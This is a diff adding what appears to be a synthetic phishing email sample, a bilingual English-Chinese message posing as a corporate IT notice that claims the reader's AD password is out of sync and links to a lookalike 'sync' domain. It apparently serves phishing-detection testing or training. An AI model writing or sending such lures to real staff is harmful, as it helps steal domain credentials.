@@ -1,0 +1,10 @@
+From: =?utf-8?B?SVQgQ2VudGVy?= <it@corp-bilingual.example>
+To: staff@corp.internal
+Date: Sun, 06 Sep 2026 09:26:00 +0800
+Message-ID: <0016-b14@synth.example>
+Subject: Password Sync Required / 密码同步通知
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>Your AD password is out of sync.</p><p>您的域密码与邮箱密码不一致，将影响移动端登录。</p><p><a href='https://ad-pwdsync-fix.example.info/sync'>Sync Now / 立即同步</a></p></body></html>
